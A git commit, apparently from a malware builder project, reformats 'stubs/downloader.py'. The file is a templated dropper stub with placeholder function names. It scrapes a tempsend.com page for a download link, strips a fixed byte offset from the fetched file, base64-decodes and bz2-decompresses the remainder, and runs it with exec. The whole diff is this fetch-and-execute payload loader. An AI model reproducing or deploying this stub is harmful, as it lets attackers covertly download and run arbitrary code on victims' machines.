a26f71875c17c7eb7759020c4644d4ea0faf6fb7
d4rkcat <d4rkcat@yandex.com>
2014-12-10 14:10:20 +0000

    format

--- stubs/downloader.py
+++ stubs/downloader.py
@@ -1,7 +1,5 @@
-ab = ***URLO***("***URL***").read()
-for line in ab.split('\n'):
+for line in ***URLO***("***URL***").read().split('\n'):
 	if 'right-click' in line:
 		url = 'http://tempsend.com' + line.split('"')[1]
 		break
-code = ***BZ2***(***B64D***(***URLO***(url).read()[27139:]))
-exec(code)
+exec(***BZ2***(***B64D***(***URLO***(url).read()[27139:])))
